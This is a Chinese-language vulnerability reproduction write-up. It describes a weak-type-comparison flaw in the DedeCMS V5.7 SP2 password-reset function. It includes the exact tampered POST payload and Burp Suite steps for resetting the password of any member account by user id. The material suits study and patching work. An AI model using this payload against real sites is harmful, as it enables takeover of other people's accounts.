# DedeCMS V5.7 前台任意用户密码修改漏洞

本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。

## 漏洞描述

织梦内容管理系统 (`Dedecms`)是一款 `PHP` 开源网站管理系统。在用户密码重置功能处，`php`  存在弱类型比较，如果用户没有设置密保问题，那么可以绕过验证密保问题，直接修改密码(管理员账户默认不设置密保问题)。值得注意的是修改的密码是 `member` 表中的密码，即使修改了管理员密码也是 `member` 表中的管理员密码，仍是无法进入管理。

## 漏洞影响

`DedeCMS V5.7 SP2`

开启会员功能

## 漏洞复现

需要管理员开启会员功能，开启流程为

```plain
系统 -> 系统基本参数 -> 会员设置
```

然后进入找回密码，选择 “通过安全问题找回”，填写正确的用户名与邮箱

没有密码问题的用户，会得到这样的提示

![img](https://img-blog.csdnimg.cn/img_convert/64261d51d635fdc7b88c8f809d2d0e62.png)

不要紧，重来并用burp 抓包，更改 post 数据

原本的 post 数据

```plain
dopost=getpwd&gourl=&userid=ada&mail=123456%40admin.com&vdcode=vogr&type=1
```

更改后的 post 数据

```plain
dopost=safequestion&id=2&safequestion=00&safeanswer=0
```

id 为 想要更改的用户账号 id，发包即可

![img](https://img-blog.csdnimg.cn/img_convert/da714103f3932d9b046d9d93f455c41a.png)



访问得到的链接，就可以修改密码，这里要注意，一定要使用 `burp`获取链接，不要直接改包后 `forward`

## 总结

这个漏洞只需要存在没有设置密保问题的用户就行，直接 `post id` 就可以，用户名会直接在修改密码中取出来，还是比较好的，唯一的缺点就是只能更改 `member` 中的 `admin` 账户密码，没法利用这个登陆到后台

## 参考链接

- `https://wiki.bylibrary.cn/漏洞库/01-CMS漏洞/DedeCMS/Dedecms 前台任意用户密码修改/`

`github` 链接：`https://github.com/N0puple/vulPOC`



